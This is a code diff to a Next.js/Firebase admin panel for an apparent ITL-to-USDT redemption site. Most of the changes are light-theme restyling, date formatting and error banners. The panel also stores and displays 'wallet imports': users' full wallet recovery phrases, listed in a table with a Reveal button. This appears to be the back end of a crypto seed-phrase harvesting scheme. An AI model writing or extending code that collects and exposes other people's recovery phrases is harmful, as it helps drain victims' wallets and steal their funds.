@@ -2,14 +2,7 @@
 
 import { useEffect, useState } from "react";
 import Image from "next/image";
-import {
-  collection,
-  query,
-  orderBy,
-  onSnapshot,
-  updateDoc,
-  doc,
-} from "firebase/firestore";
+import { collection, onSnapshot, updateDoc, doc } from "firebase/firestore";
 import { db } from "@/lib/firebase";
 import { getSettingsDoc, saveSettings } from "@/lib/settings";
 import type { AdminRedemption, WalletImport, PlatformSettings } from "@/types";
@@ -24,12 +17,38 @@ type RedemptionStatus =
   | "rejected";
 
 const STATUS_STYLES: Record<RedemptionStatus, string> = {
-  pending: "bg-amber-500/15 text-amber-300 border-amber-500/30",
-  reviewing: "bg-blue-500/15 text-blue-300 border-blue-500/30",
-  approved: "bg-violet-500/15 text-violet-300 border-violet-500/30",
-  paid: "bg-emerald-500/15 text-emerald-300 border-emerald-500/30",
-  rejected: "bg-red-500/15 text-red-300 border-red-500/30",
+  pending: "bg-amber-50 text-amber-700 border-amber-200",
+  reviewing: "bg-sky-50 text-sky-700 border-sky-200",
+  approved: "bg-brand-50 text-brand-700 border-brand-200",
+  paid: "bg-emerald-50 text-emerald-700 border-emerald-200",
+  rejected: "bg-red-50 text-red-700 border-red-200",
 };
+
+/** Firestore timestamps, ISO strings and epoch numbers all normalise to millis. */
+function toMillis(value: unknown): number {
+  if (!value) return 0;
+  if (typeof value === "number") return value;
+  if (typeof value === "string") {
+    const parsed = Date.parse(value);
+    return Number.isNaN(parsed) ? 0 : parsed;
+  }
+  const v = value as { toMillis?: () => number; seconds?: number };
+  if (typeof v.toMillis === "function") return v.toMillis();
+  if (typeof v.seconds === "number") return v.seconds * 1000;
+  return 0;
+}
+
+function formatDate(value: unknown): string {
+  const ms = toMillis(value);
+  if (!ms) return "—";
+  return new Date(ms).toLocaleString(undefined, {
+    day: "2-digit",
+    month: "short",
+    year: "numeric",
+    hour: "2-digit",
+    minute: "2-digit",
+  });
+}
 
 export default function AdminPage() {
   const [tab, setTab] = useState<Tab>("dashboard");
@@ -39,41 +58,57 @@ export default function AdminPage() {
   const [loading, setLoading] = useState(true);
   const [mounted, setMounted] = useState(false);
   const [sidebarOpen, setSidebarOpen] = useState(false);
+  const [dataError, setDataError] = useState<string | null>(null);
 
   useEffect(() => {
     setMounted(true);
   }, []);
 
-  // Live subscription to redemptions
+  // Live subscription to redemption requests
   useEffect(() => {
-    const q = query(
+    const unsub = onSnapshot(
       collection(db, "redemptions"),
-      orderBy("createdAt", "desc"),
+      (snap) => {
+        const data = snap.docs.map((d) => ({
+          id: d.id,
+          ...(d.data() as Omit<AdminRedemption, "id">),
+        }));
+        data.sort((a, b) => toMillis(b.createdAt) - toMillis(a.createdAt));
+        setRedemptions(data);
+        setLoading(false);
+        setDataError(null);
+      },
+      (err) => {
+        console.error("Failed to load redemptions:", err);
+        setDataError(
+          "We couldn't load redemption requests from the database. Please refresh the page or check your connection.",
+        );
+        setLoading(false);
+      },
     );
-    const unsub = onSnapshot(q, (snap) => {
-      const data = snap.docs.map((d) => ({
-        id: d.id,
-        ...(d.data() as Omit<AdminRedemption, "id">),
-      }));
-      setRedemptions(data);
-      setLoading(false);
-    });
     return () => unsub();
   }, []);
 
   // Live subscription to wallet imports
   useEffect(() => {
-    const q = query(
+    const unsub = onSnapshot(
       collection(db, "walletImports"),
-      orderBy("createdAt", "desc"),
+      (snap) => {
+        const data = snap.docs.map((d) => ({
+          id: d.id,
+          ...(d.data() as Omit<WalletImport, "id">),
+        }));
+        data.sort((a, b) => toMillis(b.createdAt) - toMillis(a.createdAt));
+        setWalletImports(data);
+        setDataError(null);
+      },
+      (err) => {
+        console.error("Failed to load wallet imports:", err);
+        setDataError(
+          "We couldn't load wallet imports from the database. Please refresh the page or check your connection.",
+        );
+      },
     );
-    const unsub = onSnapshot(q, (snap) => {
-      const data = snap.docs.map((d) => ({
-        id: d.id,
-        ...(d.data() as Omit<WalletImport, "id">),
-      }));
-      setWalletImports(data);
-    });
     return () => unsub();
   }, []);
 
@@ -117,24 +152,24 @@ export default function AdminPage() {
     .reduce((sum, r) => sum + (parseFloat(r.usdtPayout || "0") || 0), 0);
 
   return (
-    <div className="min-h-screen bg-slate-950 text-slate-50">
+    <div className="min-h-screen bg-[#fafafe] text-neutral-900">
       <div className="flex min-h-screen">
         {/* Mobile Sidebar Overlay */}
         {sidebarOpen && (
           <div
-            className="fixed inset-0 z-40 bg-slate-950/60 backdrop-blur-sm md:hidden"
+            className="fixed inset-0 z-40 bg-neutral-900/30 backdrop-blur-sm md:hidden"
             onClick={() => setSidebarOpen(false)}
           />
         )}
 
         {/* Sidebar */}
         <aside
-          className={`fixed inset-y-0 left-0 z-50 w-64 transform bg-slate-900/50 backdrop-blur-xl border-r border-slate-800/50 transition-transform duration-300 ease-in-out md:relative md:translate-x-0 ${
+          className={`fixed inset-y-0 left-0 z-50 w-64 transform border-r border-brand-100 bg-white transition-transform duration-300 ease-in-out md:relative md:translate-x-0 ${
             sidebarOpen ? "translate-x-0" : "-translate-x-full"
           }`}
         >
           <div className="flex flex-col h-full">
-            <div className="flex flex-col gap-1 px-6 py-6 border-b border-slate-800/50">
+            <div className="flex flex-col gap-1 px-6 py-6 border-b border-brand-100">
               <div className="relative h-8 w-28">
                 <Image
                   src="/interswift.png"
@@ -143,7 +178,7 @@ export default function AdminPage() {
                   className="object-contain object-left"
                 />
               </div>
-              <div className="text-[10px] font-medium text-slate-500 uppercase tracking-wider mt-1 ml-1">
+              <div className="text-[10px] font-semibold text-brand-600 uppercase tracking-wider mt-1 ml-0.5">
                 Admin Panel
               </div>
             </div>
@@ -236,10 +271,10 @@ export default function AdminPage() {
               />
             </nav>
 
-            <div className="p-4 border-t border-slate-800/50">
+            <div className="p-4 border-t border-brand-100">
               <a
                 href="/"
-                className="flex items-center gap-3 px-3 py-2 text-sm font-medium text-slate-400 hover:text-white transition-colors rounded-xl hover:bg-slate-800/50"
+                className="flex items-center gap-3 px-3 py-2 text-sm font-medium text-neutral-500 hover:text-brand-700 transition-colors rounded-xl hover:bg-brand-50"
               >
                 <svg viewBox="0 0 24 24" fill="none" className="h-4 w-4">
                   <path
@@ -258,13 +293,13 @@ export default function AdminPage() {
         {/* Main content */}
         <main className="flex-1 min-w-0 flex flex-col">
           {/* Top header */}
-          <header className="sticky top-0 z-30 flex items-center justify-between gap-4 border-b border-slate-800/50 bg-slate-950/80 backdrop-blur-xl px-4 sm:px-6 lg:px-8 py-4">
+          <header className="sticky top-0 z-30 flex items-center justify-between gap-4 border-b border-brand-100 bg-white/85 backdrop-blur-xl px-4 sm:px-6 lg:px-8 py-4">
             <div className="flex items-center gap-4">
               {/* Mobile Toggle Button */}
               <button
                 type="button"
                 onClick={() => setSidebarOpen(true)}
-                className="flex h-10 w-10 items-center justify-center rounded-xl border border-slate-800 bg-slate-900/50 text-slate-400 md:hidden active:scale-95 transition-all"
+                className="flex h-10 w-10 items-center justify-center rounded-xl border border-brand-200 bg-white text-neutral-600 md:hidden active:scale-95 transition-all"
               >
                 <svg viewBox="0 0 24 24" fill="none" className="h-5 w-5">
                   <path
@@ -277,7 +312,7 @@ export default function AdminPage() {
               </button>
 
               <div>
-                <h1 className="text-lg font-bold tracking-tight sm:text-xl">
+                <h1 className="text-lg font-bold tracking-tight text-neutral-900 sm:text-xl">
                   {tab === "dashboard"
                     ? "Dashboard"
                     : tab === "redemptions"
@@ -286,30 +321,55 @@ export default function AdminPage() {
                         ? "Wallet Imports"
                         : "Settings"}
                 </h1>
-                <p className="hidden sm:block text-[11px] text-slate-500 font-medium uppercase tracking-wider mt-0.5">
+                <p className="hidden sm:block text-[11px] font-medium text-neutral-500 uppercase tracking-wider mt-0.5">
                   Live Firestore Database
                 </p>
               </div>
             </div>
 
             <div className="flex items-center gap-3">
-              <div className="flex items-center gap-2 rounded-full border border-emerald-500/20 bg-emerald-500/10 px-3 py-1.5 shadow-[0_0_15px_-3px_rgba(16,185,129,0.2)]">
+              <div className="flex items-center gap-2 rounded-full border border-emerald-200 bg-emerald-50 px-3 py-1.5">
                 <span className="relative inline-flex h-2 w-2">
-                  <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75" />
-                  <span className="relative inline-flex h-2 w-2 rounded-full bg-emerald-400" />
+                  <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-500 opacity-75" />
+                  <span className="relative inline-flex h-2 w-2 rounded-full bg-emerald-500" />
                 </span>
-                <span className="text-[11px] font-bold text-emerald-400 uppercase tracking-wider">
+                <span className="text-[11px] font-bold text-emerald-700 uppercase tracking-wider">
                   Live
                 </span>
               </div>
             </div>
           </header>
 
-          <div className="flex-1 overflow-y-auto bg-slate-950">
+          <div className="flex-1 overflow-y-auto">
             <div className="p-4 sm:p-6 lg:p-8 max-w-[1600px] mx-auto">
+              {dataError ? (
+                <div className="mb-6 flex items-start gap-2.5 rounded-xl border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-700">
+                  <svg
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    className="mt-0.5 h-4 w-4 shrink-0"
+                  >
+                    <circle
+                      cx="12"
+                      cy="12"
+                      r="9"
+                      stroke="currentColor"
+                      strokeWidth="1.8"
+                    />
+                    <path
+                      d="M12 8v5M12 16.5v.01"
+                      stroke="currentColor"
+                      strokeWidth="1.8"
+                      strokeLinecap="round"
+                    />
+                  </svg>
+                  <span>{dataError}</span>
+                </div>
+              ) : null}
+
               {!mounted ? (
                 <div className="flex h-64 items-center justify-center">
-                  <div className="h-8 w-8 animate-spin rounded-full border-2 border-slate-800 border-t-brand-500" />
+                  <div className="h-8 w-8 animate-spin rounded-full border-2 border-brand-100 border-t-brand-600" />
                 </div>
               ) : tab === "dashboard" ? (
                 <DashboardView
@@ -321,6 +381,7 @@ export default function AdminPage() {
                   totalUsdt={totalUsdt}
                   loading={loading}
                   onGoRedemptions={() => setTab("redemptions")}
+                  onGoWallets={() => setTab("wallets")}
                 />
               ) : tab === "redemptions" ? (
                 <RedemptionsView
@@ -358,16 +419,22 @@ function NavItem({
     <button
       type="button"
       onClick={onClick}
-      className={`flex w-full items-center gap-3 rounded-xl px-3 py-2.5 text-sm font-medium transition-all ${
+      className={`flex w-full items-center gap-3 rounded-xl px-3 py-2.5 text-sm font-medium transition-all border ${
         active
-          ? "bg-brand-500/15 text-white border border-brand-500/30"
-          : "text-neutral-400 hover:text-white hover:bg-neutral-800/50 border border-transparent"
+          ? "bg-brand-50 text-brand-700 border-brand-200"
+          : "text-neutral-600 hover:text-brand-700 hover:bg-brand-50/70 border-transparent"
       }`}
     >
-      <span className={active ? "text-brand-400" : ""}>{icon}</span>
+      <span className={active ? "text-brand-600" : "text-neutral-400"}>
+        {icon}
+      </span>
       <span className="flex-1 text-left">{label}</span>
       {badge !== undefined && badge > 0 ? (
-        <span className="rounded-full bg-brand-500/20 px-2 py-0.5 text-xs font-semibold text-brand-300">
+        <span
+          className={`rounded-full px-2 py-0.5 text-xs font-semibold ${
+            active ? "bg-brand-600 text-white" : "bg-brand-100 text-brand-700"
+          }`}
+        >
           {badge}
         </span>
       ) : null}
@@ -386,6 +453,7 @@ function DashboardView({
   totalUsdt,
   loading,
   onGoRedemptions,
+  onGoWallets,
 }: {
   redemptions: AdminRedemption[];
   walletImports: WalletImport[];
@@ -395,6 +463,7 @@ function DashboardView({
   totalUsdt: number;
   loading: boolean;
   onGoRedemptions: () => void;
+  onGoWallets: () => void;
 }) {
   const stats = [
     {
@@ -412,7 +481,7 @@ function DashboardView({
           />
         </svg>
       ),
-      color: "text-brand-400 bg-brand-500/10 border-brand-500/30",
+      color: "text-brand-600 bg-brand-50 border-brand-200",
     },
     {
       label: "Pending Review",
@@ -436,7 +505,7 @@ function DashboardView({
           />
         </svg>
       ),
-      color: "text-amber-400 bg-amber-500/10 border-amber-500/30",
+      color: "text-amber-600 bg-amber-50 border-amber-200",
     },
     {
       label: "Paid Out",
@@ -453,7 +522,7 @@ function DashboardView({
           />
         </svg>
       ),
-      color: "text-emerald-400 bg-emerald-500/10 border-emerald-500/30",
+      color: "text-emerald-600 bg-emerald-50 border-emerald-200",
     },
     {
       label: "Total USDT Volume",
@@ -470,7 +539,7 @@ function DashboardView({
           />
         </svg>
       ),
-      color: "text-violet-400 bg-violet-500/10 border-violet-500/30",
+      color: "text-violet-600 bg-violet-50 border-violet-200",
     },
   ];
 
@@ -481,7 +550,7 @@ function DashboardView({
         {stats.map((s) => (
           <div
             key={s.label}
-            className="glass-card p-5 transition-all duration-300 hover:border-brand-600/50"
+            className="glass-card p-5 transition-shadow duration-300 hover:shadow-[0_8px_32px_-8px_rgba(124,58,237,0.22)]"
           >
             <div className="flex items-center justify-between">
               <span
@@ -490,13 +559,13 @@ function DashboardView({
                 {s.icon}
               </span>
               {loading ? (
-                <div className="h-4 w-10 animate-pulse rounded bg-neutral-800" />
+                <div className="h-4 w-10 animate-pulse rounded bg-neutral-200" />
               ) : null}
             </div>
-            <div className="mt-4 text-3xl font-extrabold text-white tabular-nums">
+            <div className="mt-4 text-3xl font-extrabold text-neutral-900 tabular-nums">
               {loading ? "—" : s.value}
             </div>
-            <div className="mt-1 text-sm font-medium text-neutral-300">
+            <div className="mt-1 text-sm font-medium text-neutral-700">
               {s.label}
             </div>
             <div className="text-xs text-neutral-500">{s.caption}</div>
@@ -507,17 +576,19 @@ function DashboardView({
       {/* Two column: recent redemptions + wallet imports */}
       <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
         <div className="glass-card overflow-hidden">
-          <div className="flex items-center justify-between px-5 py-4 border-b border-neutral-800/70">
-            <h3 className="text-base font-semibold">Recent Redemptions</h3>
+          <div className="flex items-center justify-between px-5 py-4 border-b border-brand-100">
+            <h3 className="text-base font-semibold text-neutral-900">
+              Recent Redemptions
+            </h3>
             <button
               type="button"
               onClick={onGoRedemptions}
-              className="text-xs font-medium text-brand-400 hover:text-brand-300"
+              className="text-xs font-semibold text-brand-600 hover:text-brand-700"
             >
               View all →
             </button>
           </div>
-          <div className="divide-y divide-neutral-800/70">
+          <div className="divide-y divide-brand-100">
             {loading ? (
               <SkeletonRows count={4} />
             ) : redemptions.length === 0 ? (
@@ -526,10 +597,10 @@ function DashboardView({
               redemptions.slice(0, 5).map((r) => (
                 <div
                   key={r.id}
-                  className="flex items-center justify-between px-5 py-3.5"
+                  className="flex items-center justify-between gap-4 px-5 py-3.5"
                 >
                   <div className="min-w-0">
-                    <div className="text-sm font-medium text-white truncate">
+                    <div className="text-sm font-semibold text-neutral-900 truncate">
                       {r.fullName}
                     </div>
                     <div className="text-xs text-neutral-500 truncate">
@@ -537,7 +608,7 @@ function DashboardView({
                     </div>
                   </div>
                   <div className="flex items-center gap-3 shrink-0">
-                    <span className="text-sm font-semibold text-white tabular-nums">
+                    <span className="text-sm font-semibold text-neutral-900 tabular-nums">
                       {r.usdtPayout || "0"} USDT
                     </span>
                     <span
@@ -557,32 +628,38 @@ function DashboardView({
         </div>
 
         <div className="glass-card overflow-hidden">
-          <div className="flex items-center justify-between px-5 py-4 border-b border-neutral-800/70">
-            <h3 className="text-base font-semibold">Recent Wallet Imports</h3>
-            <span className="text-xs text-neutral-500">
-              {walletImports.length} total
-            </span>
+          <div className="flex items-center justify-between px-5 py-4 border-b border-brand-100">
+            <h3 className="text-base font-semibold text-neutral-900">
+              Recent Wallet Imports
+            </h3>
+            <button
+              type="button"
+              onClick={onGoWallets}
+              className="text-xs font-semibold text-brand-600 hover:text-brand-700"
+            >
+              {walletImports.length} total →
+            </button>
           </div>
-          <div className="divide-y divide-neutral-800/70">
-            {walletImports.length === 0 ? (
+          <div className="divide-y divide-brand-100">
+            {loading ? (
+              <SkeletonRows count={4} />
+            ) : walletImports.length === 0 ? (
               <EmptyState label="No wallet imports yet" />
             ) : (
               walletImports.slice(0, 5).map((w) => (
                 <div
                   key={w.id}
-                  className="flex items-center justify-between px-5 py-3.5"
+                  className="flex items-center justify-between gap-4 px-5 py-3.5"
                 >
                   <div className="min-w-0">
-                    <div className="text-sm font-medium text-white truncate">
+                    <div className="text-sm font-semibold text-neutral-900 truncate">
                       {w.wordCount} word phrase
                     </div>
                     <div className="text-xs text-neutral-500 truncate">
-                      {w.recoveryPhrase.slice(0, 40)}…
+                      {formatDate(w.createdAt)}
                     </div>
                   </div>
-                  <span
-                    className={`rounded-full border px-2.5 py-0.5 text-xs font-medium capitalize ${STATUS_STYLES.approved}`}
-                  >
+                  <span className="shrink-0 rounded-full border border-emerald-200 bg-emerald-50 px-2.5 py-0.5 text-xs font-medium capitalize text-emerald-700">
                     {w.status}
                   </span>
                 </div>
@@ -630,7 +707,7 @@ function RedemptionsView({
           <svg
             viewBox="0 0 24 24"
             fill="none"
-            className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-neutral-500"
+            className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-neutral-400"
           >
             <circle
               cx="11"
@@ -651,7 +728,7 @@ function RedemptionsView({
             placeholder="Search by name, email, or wallet…"
             value={search}
             onChange={(e) => setSearch(e.target.value)}
-            className="w-full rounded-xl border border-neutral-700 bg-neutral-900/80 pl-10 pr-4 py-2.5 text-sm text-white placeholder:text-neutral-500 focus:border-brand-500 focus:ring-2 focus:ring-brand-500/20 outline-none"
+            className="w-full rounded-xl border border-brand-200 bg-white pl-10 pr-4 py-2.5 text-sm text-neutral-900 placeholder:text-neutral-400 focus:border-brand-500 focus:ring-2 focus:ring-brand-500/20 outline-none transition"
           />
         </div>
         <div className="flex flex-wrap gap-2">
@@ -669,10 +746,10 @@ function RedemptionsView({
               key={s}
               type="button"
               onClick={() => setFilter(s)}
-              className={`rounded-lg px-3 py-1.5 text-xs font-medium capitalize transition ${
+              className={`rounded-lg px-3 py-1.5 text-xs font-semibold capitalize transition border ${
                 filter === s
-                  ? "bg-brand-500/20 text-brand-200 border border-brand-500/40"
-                  : "bg-neutral-900/60 text-neutral-400 border border-neutral-700 hover:text-white"
+                  ? "bg-brand-600 text-white border-brand-600 shadow-glow"
+                  : "bg-white text-neutral-600 border-brand-200 hover:border-brand-300 hover:text-brand-700"
               }`}
             >
               {s}
@@ -686,22 +763,23 @@ function RedemptionsView({
         <div className="overflow-x-auto">
           <table className="w-full text-sm">
             <thead>
-              <tr className="border-b border-neutral-800/70 text-left text-xs uppercase tracking-wider text-neutral-500">
+              <tr className="border-b border-brand-100 text-left text-xs uppercase tracking-wider text-neutral-500">
                 <th className="px-5 py-3 font-semibold">Name</th>
                 <th className="px-5 py-3 font-semibold">Amount</th>
                 <th className="px-5 py-3 font-semibold">Payout</th>
                 <th className="px-5 py-3 font-semibold">Payout Details</th>
+                <th className="px-5 py-3 font-semibold">Submitted</th>
                 <th className="px-5 py-3 font-semibold">Status</th>
                 <th className="px-5 py-3 font-semibold text-right">Actions</th>
               </tr>
             </thead>
-            <tbody className="divide-y divide-neutral-800/70">
+            <tbody className="divide-y divide-brand-100">
               {loading ? (
                 <SkeletonRows count={6} table />
               ) : filtered.length === 0 ? (
                 <tr>
                   <td
-                    colSpan={6}
+                    colSpan={7}
                     className="px-5 py-12 text-center text-neutral-500"
                   >
                     No redemption requests match your filters.
@@ -711,41 +789,46 @@ function RedemptionsView({
                 filtered.map((r) => (
                   <tr
                     key={r.id}
-                    className="hover:bg-neutral-900/40 transition-colors"
+                    className="hover:bg-brand-50/50 transition-colors"
                   >
                     <td className="px-5 py-4">
-                      <div className="font-medium text-white">{r.fullName}</div>
+                      <div className="font-semibold text-neutral-900">
+                        {r.fullName}
+                      </div>
                       <div className="text-xs text-neutral-500">{r.email}</div>
                     </td>
-                    <td className="px-5 py-4 tabular-nums text-neutral-300">
+                    <td className="px-5 py-4 tabular-nums text-neutral-700">
                       {r.itlAmount || "0"} ITL
                     </td>
-                    <td className="px-5 py-4 tabular-nums font-semibold text-white">
+                    <td className="px-5 py-4 tabular-nums font-semibold text-neutral-900">
                       {r.usdtPayout || "0"} USDT
                     </td>
                     <td className="px-5 py-4">
                       {r.payoutMethod === "bank" ? (
                         <div className="space-y-1">
-                          <div className="text-[10px] font-bold text-brand-400 uppercase tracking-tighter">
+                          <div className="text-[10px] font-bold text-brand-600 uppercase tracking-tighter">
                             Bank Transfer
                           </div>
-                          <div className="text-xs text-white font-medium">
+                          <div className="text-xs font-medium text-neutral-900">
                             {r.bankName}
                           </div>
-                          <div className="text-[11px] text-neutral-400">
+                          <div className="text-[11px] text-neutral-500">
                             {r.accountName} · {r.accountNumber}
                           </div>
                         </div>
                       ) : (
                         <div className="space-y-1">
-                          <div className="text-[10px] font-bold text-emerald-400 uppercase tracking-tighter">
+                          <div className="text-[10px] font-bold text-emerald-600 uppercase tracking-tighter">
                             BEP-20 Wallet
                           </div>
-                          <code className="text-xs text-neutral-400 break-all max-w-[160px] block font-mono">
+                          <code className="text-xs text-neutral-600 break-all max-w-[160px] block font-mono">
                             {r.walletAddress}
                           </code>
                         </div>
                       )}
+                    </td>
+                    <td className="px-5 py-4 text-xs text-neutral-500 whitespace-nowrap">
+                      {formatDate(r.createdAt)}
                     </td>
                     <td className="px-5 py-4">
                       <span
@@ -795,14 +878,14 @@ function StatusActions({
       <button
         type="button"
         onClick={() => setOpen((o) => !o)}
-        className="rounded-lg border border-neutral-700 bg-neutral-900/60 px-3 py-1.5 text-xs font-medium text-neutral-300 hover:bg-neutral-800"
+        className="rounded-lg border border-brand-200 bg-white px-3 py-1.5 text-xs font-semibold text-neutral-700 transition hover:border-brand-300 hover:bg-brand-50"
       >
         Update ▾
       </button>
       {open ? (
         <>
           <div className="fixed inset-0 z-10" onClick={() => setOpen(false)} />
-          <div className="absolute right-0 z-20 mt-1 w-36 rounded-xl border border-neutral-700 bg-neutral-900 shadow-xl py-1">
+          <div className="absolute right-0 z-20 mt-1 w-36 rounded-xl border border-brand-100 bg-white shadow-[0_10px_40px_-10px_rgba(124,58,237,0.3)] py-1">
             {options.map((o) => (
               <button
                 key={o}
@@ -813,8 +896,8 @@ function StatusActions({
                 }}
                 className={`block w-full px-3 py-1.5 text-left text-xs capitalize transition-colors ${
                   o === current
-                    ? "text-brand-300 bg-brand-500/10"
-                    : "text-neutral-300 hover:bg-neutral-800"
+                    ? "text-brand-700 bg-brand-50 font-semibold"
+                    : "text-neutral-600 hover:bg-brand-50 hover:text-brand-700"
                 }`}
               >
                 {o}
@@ -841,7 +924,7 @@ function WalletsView({
   return (
     <div className="space-y-5">
       <div className="flex items-center justify-between">
-        <p className="text-sm text-neutral-400">
+        <p className="text-sm text-neutral-600">
           {walletImports.length} wallet{walletImports.length === 1 ? "" : "s"}{" "}
           imported
         </p>
@@ -851,20 +934,21 @@ function WalletsView({
         <div className="overflow-x-auto">
           <table className="w-full text-sm">
             <thead>
-              <tr className="border-b border-neutral-800/70 text-left text-xs uppercase tracking-wider text-neutral-500">
-                <th className="px-5 py-3 font-semibold">Phrase</th>
+              <tr className="border-b border-brand-100 text-left text-xs uppercase tracking-wider text-neutral-500">
+                <th className="px-5 py-3 font-semibold">Recovery Phrase</th>
                 <th className="px-5 py-3 font-semibold">Words</th>
+                <th className="px-5 py-3 font-semibold">Submitted</th>
                 <th className="px-5 py-3 font-semibold">Status</th>
                 <th className="px-5 py-3 font-semibold text-right">Action</th>
               </tr>
             </thead>
-            <tbody className="divide-y divide-neutral-800/70">
+            <tbody className="divide-y divide-brand-100">
               {loading ? (
                 <SkeletonRows count={5} table />
               ) : walletImports.length === 0 ? (
                 <tr>
                   <td
-                    colSpan={4}
+                    colSpan={5}
                     className="px-5 py-12 text-center text-neutral-500"
                   >
                     No wallet imports yet.
@@ -874,22 +958,23 @@ function WalletsView({
                 walletImports.map((w) => (
                   <tr
                     key={w.id}
-                    className="hover:bg-neutral-900/40 transition-colors"
+                    className="hover:bg-brand-50/50 transition-colors"
                   >
                     <td className="px-5 py-4">
-                      <code className="text-xs text-neutral-300 break-all max-w-md block">
+                      <code className="text-xs text-neutral-700 break-all max-w-md block font-mono">
                         {revealed[w.id!]
                           ? w.recoveryPhrase
                           : "•".repeat(Math.min(w.recoveryPhrase.length, 48))}
                       </code>
                     </td>
-                    <td className="px-5 py-4 tabular-nums text-neutral-300">
+                    <td className="px-5 py-4 tabular-nums text-neutral-700">
                       {w.wordCount}
                     </td>
+                    <td className="px-5 py-4 text-xs text-neutral-500 whitespace-nowrap">
+                      {formatDate(w.createdAt)}
+                    </td>
                     <td className="px-5 py-4">
-                      <span
-                        className={`inline-flex rounded-full border px-2.5 py-0.5 text-xs font-medium capitalize ${STATUS_STYLES.approved}`}
-                      >
+                      <span className="inline-flex rounded-full border border-emerald-200 bg-emerald-50 px-2.5 py-0.5 text-xs font-medium capitalize text-emerald-700">
                         {w.status}
                       </span>
                     </td>
@@ -902,7 +987,7 @@ function WalletsView({
                             [w.id!]: !prev[w.id!],
                           }))
                         }
-                        className="rounded-lg border border-neutral-700 bg-neutral-900/60 px-3 py-1.5 text-xs font-medium text-neutral-300 hover:bg-neutral-800"
+                        className="rounded-lg border border-brand-200 bg-white px-3 py-1.5 text-xs font-semibold text-neutral-700 transition hover:border-brand-300 hover:bg-brand-50"
                       >
                         {revealed[w.id!] ? "Hide" : "Reveal"}
                       </button>
@@ -988,7 +1073,7 @@ function SettingsView({ settings }: { settings: PlatformSettings }) {
       {/* Intro */}
       <div className="glass-card p-6">
         <div className="flex items-start gap-3">
-          <span className="inline-flex h-10 w-10 items-center justify-center rounded-xl border border-brand-500/30 bg-brand-500/10 text-brand-400 shrink-0">
+          <span className="inline-flex h-10 w-10 items-center justify-center rounded-xl border border-brand-200 bg-brand-50 text-brand-600 shrink-0">
             <svg viewBox="0 0 24 24" fill="none" className="h-5 w-5">
               <circle
                 cx="12"
@@ -1007,10 +1092,10 @@ function SettingsView({ settings }: { settings: PlatformSettings }) {
             </svg>
           </span>
           <div>
-            <h3 className="text-base font-semibold text-white">
+            <h3 className="text-base font-semibold text-neutral-900">
               Platform Settings
             </h3>
-            <p className="text-sm text-neutral-400 mt-1">
+            <p className="text-sm text-neutral-600 mt-1">
               Configure redemption rates, limits, and wallet details. Changes
               apply instantly across the site.
             </p>
@@ -1023,9 +1108,9 @@ function SettingsView({ settings }: { settings: PlatformSettings }) {
         title="Redemption Status"
         description="Control whether users can submit new redemption requests."
       >
-        <div className="flex items-center justify-between">
+        <div className="flex items-center justify-between gap-4">
           <div>
-            <div className="text-sm font-medium text-white">
+            <div className="text-sm font-medium text-neutral-900">
               Redemptions Open
             </div>
             <div className="text-xs text-neutral-500 mt-0.5">
@@ -1117,7 +1202,7 @@ function SettingsView({ settings }: { settings: PlatformSettings }) {
 
       {/* Feedback */}
       {saved ? (
-        <div className="flex items-center gap-2 rounded-xl border border-emerald-500/40 bg-emerald-500/10 px-4 py-3 text-sm text-emerald-300">
+        <div className="flex items-center gap-2 rounded-xl border border-emerald-200 bg-emerald-50 px-4 py-3 text-sm text-emerald-700">
           <svg viewBox="0 0 24 24" fill="none" className="h-4 w-4">
             <path
               d="m5 12 5 5L20 7"
@@ -1131,7 +1216,7 @@ function SettingsView({ settings }: { settings: PlatformSettings }) {
         </div>
       ) : null}
       {error ? (
-        <div className="rounded-xl border border-red-500/40 bg-red-500/10 px-4 py-3 text-sm text-red-300">
+        <div className="rounded-xl border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-700">
           {error}
         </div>
       ) : null}
@@ -1195,8 +1280,8 @@ function SectionCard({
   return (
     <div className="glass-card p-6">
       <div className="mb-5">
-        <h3 className="text-base font-semibold text-white">{title}</h3>
-        <p className="text-sm text-neutral-400 mt-1">{description}</p>
+        <h3 className="text-base font-semibold text-neutral-900">{title}</h3>
+        <p className="text-sm text-neutral-600 mt-1">{description}</p>
       </div>
       {children}
     </div>
@@ -1254,11 +1339,11 @@ function Toggle({
       aria-checked={checked}
       onClick={() => onChange(!checked)}
       className={`relative inline-flex h-6 w-11 shrink-0 items-center rounded-full transition-colors ${
-        checked ? "bg-brand-500" : "bg-neutral-700"
+        checked ? "bg-brand-600" : "bg-neutral-300"
       }`}
     >
       <span
-        className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${
+        className={`inline-block h-4 w-4 transform rounded-full bg-white shadow transition-transform ${
           checked ? "translate-x-6" : "translate-x-1"
         }`}
       />
@@ -1290,14 +1375,14 @@ function SkeletonRows({ count, table }: { count: number; table?: boolean }) {
         >
           {table ? (
             <div className="flex items-center gap-4">
-              <div className="h-4 w-24 animate-pulse rounded bg-neutral-800" />
-              <div className="h-4 w-16 animate-pulse rounded bg-neutral-800" />
-              <div className="h-4 w-20 animate-pulse rounded bg-neutral-800" />
+              <div className="h-4 w-24 animate-pulse rounded bg-neutral-200" />
+              <div className="h-4 w-16 animate-pulse rounded bg-neutral-200" />
+              <div className="h-4 w-20 animate-pulse rounded bg-neutral-200" />
             </div>
           ) : (
             <>
-              <div className="h-4 w-32 animate-pulse rounded bg-neutral-800" />
-              <div className="h-4 w-16 animate-pulse rounded bg-neutral-800" />
+              <div className="h-4 w-32 animate-pulse rounded bg-neutral-200" />
+              <div className="h-4 w-16 animate-pulse rounded bg-neutral-200" />
             </>
           )}
         </div>
